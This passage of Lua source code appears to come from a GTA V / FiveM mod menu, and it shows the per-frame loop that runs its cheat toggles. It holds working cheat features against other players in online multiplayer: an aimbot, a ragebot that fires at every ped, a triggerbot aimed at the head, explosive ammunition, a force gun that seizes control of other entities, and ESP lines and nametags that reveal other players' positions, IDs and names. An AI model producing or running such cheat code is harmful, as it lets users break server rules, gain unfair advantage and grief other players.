                DrawRect(0.75, 0.5, 0.01, 0.515, 255, 80, 80, 100)
                DrawRect(0.5, 0.25, 0.49, 0.015, 255, 80, 80, 100)
                DrawRect(0.5, 0.75, 0.49, 0.015, 255, 80, 80, 100)
            end
            
            local plist = GetActivePlayers()
            for i = 1, #plist do
                ShootAimbot(GetPlayerPed(plist[i]))
            end
        
        end
        
        if Ragebot and IsDisabledControlPressed(0, Keys["MOUSE1"]) then
            for k in EnumeratePeds() do
                if k ~= PlayerPedId() then RageShoot(k) end
            end
        end
        
        if Crosshair then
            ShowHudComponentThisFrame(14)
        end
        
        if ShowCoords then
            local pos = GetEntityCoords(PlayerPedId())
            DrawTxt("~b~X: ~w~" .. round(pos.x, 3), 0.38, 0.03, 0.0, 0.4)
            DrawTxt("~b~Y: ~w~" .. round(pos.y, 3), 0.45, 0.03, 0.0, 0.4)
            DrawTxt("~b~Z: ~w~" .. round(pos.z, 3), 0.52, 0.03, 0.0, 0.4)
        end
        
        if ExplosiveAmmo then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
                AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
            end
        end
        
        if ForceGun then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
                for k in EnumeratePeds() do
                    local coords = GetEntityCoords(k)
                    if k ~= PlayerPedId() and GetDistanceBetweenCoords(pos, coords) <= 1.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
                
                for k in EnumerateVehicles() do
                    local coords = GetEntityCoords(k)
                    if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) and GetDistanceBetweenCoords(pos, coords) <= 3.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
            
            end
        end
        
        if Triggerbot then
            local hasTarget, target = GetEntityPlayerIsFreeAimingAt(PlayerId())
            if hasTarget and IsEntityAPed(target) then
                ShootAt(target, "SKEL_HEAD")
            end
        end
        
        if not Collision then
            playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
            for k in EnumerateVehicles() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumerateObjects() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumeratePeds() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
        end
        
        if DeadlyBulldozer then
            SetVehicleBulldozerArmPosition(GetVehiclePedIsIn(PlayerPedId(), 0), math.random() % 1, 1)
            SetVehicleEngineHealth(GetVehiclePedIsIn(PlayerPedId(), 0), 1000.0)
            if not IsPedInAnyVehicle(PlayerPedId(), 0) then
                DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 1))
                DeadlyBulldozer = not DeadlyBulldozer
            elseif IsDisabledControlJustPressed(0, Keys["E"]) then
                local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                local coords = GetEntityCoords(veh)
                local forward = GetEntityForwardVector(veh)
                local heading = GetEntityHeading(veh)
                local veh = CreateVehicle(GetHashKey("BULLDOZER"), coords.x + forward.x * 10, coords.y + forward.y * 10, coords.z, heading, 1, 1)
                SetVehicleColours(veh, 27, 27)
                SetVehicleEngineHealth(veh, -3500.0)
                ApplyForce(veh, forward * 500.0)
            end
        end
        
        if WarMenu.IsMenuOpened('objectlist') then
            for i = 1, #SpawnedObjects do
                local x, y, z = table.unpack(GetEntityCoords(SpawnedObjects[i]))
                DrawText3D(x, y, z, "OBJECT " .. "[" .. i .. "] " .. "WITH ID " .. SpawnedObjects[i])
            end
        end
        
        if NametagsEnabled then
            tags_plist = GetActivePlayers()
            for i = 1, #tags_plist do
                if NetworkIsPlayerTalking(tags_plist[i]) then
                    SetMpGamerTagVisibility(ptags[i], 4, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 4, 0)
                end
                
                if IsPedInAnyVehicle(GetPlayerPed(tags_plist[i])) and GetSeatPedIsIn(GetPlayerPed(tags_plist[i])) == 0 then
                    SetMpGamerTagVisibility(ptags[i], 8, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 8, 0)
                end
            
            end
        end
        
        if ANametagsEnabled then
            local plist = GetActivePlayers()
            table.removekey(plist, PlayerId())
            for i = 1, #plist do
                local pos = GetEntityCoords(GetPlayerPed(plist[i]))
                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), pos)
                if distance <= 30 then
                    if ANametagsNotNeedLOS then
                        DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "\n~b~Name: ~w~" .. GetPlayerName(plist[i]))
                    elseif not ANametagsNotNeedLOS and HasEntityClearLosToEntity(PlayerPedId(), GetPlayerPed(plist[i]), 17) then
                        DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "\n~b~Name: ~w~" .. GetPlayerName(plist[i]))
                    end
                end
            end
        end
        
        if LinesEnabled then
            local plist = GetActivePlayers()
            local playerCoords = GetEntityCoords(PlayerPedId())
            for i = 1, #plist do
                if i == PlayerId() then i = i + 1 end
                local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
                DrawLine(playerCoords, targetCoords, 0, 0, 255, 255)
            end
        end

	if WeatherChanger then
	    SetWeatherTypePersist(WeatherType)
	    SetWeatherTypeNowPersist(WeatherType)
	    SetWeatherTypeNow(WeatherType)
	    SetOverrideWeather(WeatherType)
	end
        
        if Radio then
            PortableRadio = true
            SetRadioToStationIndex(RadioStation)
        elseif not Radio then
            PortableRadio = false
        end

        if PortableRadio then
            SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), false)
            SetMobilePhoneRadioState(true)
            SetMobileRadioEnabledDuringGameplay(true)
            HideHudComponentThisFrame(16)
        elseif not PortableRadio then
            SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), true)
            SetMobilePhoneRadioState(false)
            SetMobileRadioEnabledDuringGameplay(false)
            ShowHudComponentThisFrame(16)
            local radioIndex = GetPlayerRadioStationIndex()

            if IsPedInAnyVehicle(PlayerPedId(), false) and radioIndex + 1 ~= 19 then --Los Santos Underground Radio doesn't properly work
                -- Updates the radio selections on the menu
                currRadioIndex = radioIndex + 1
                selRadioIndex = radioIndex + 1
            end
        end

        if ForceMap then
            DisplayRadar(true)
        end
        
        if ForceThirdPerson then
			SetFollowPedCamViewMode(0)
			SetFollowVehicleCamViewMode(0)
        end
        
        Wait(0)
    end
end)

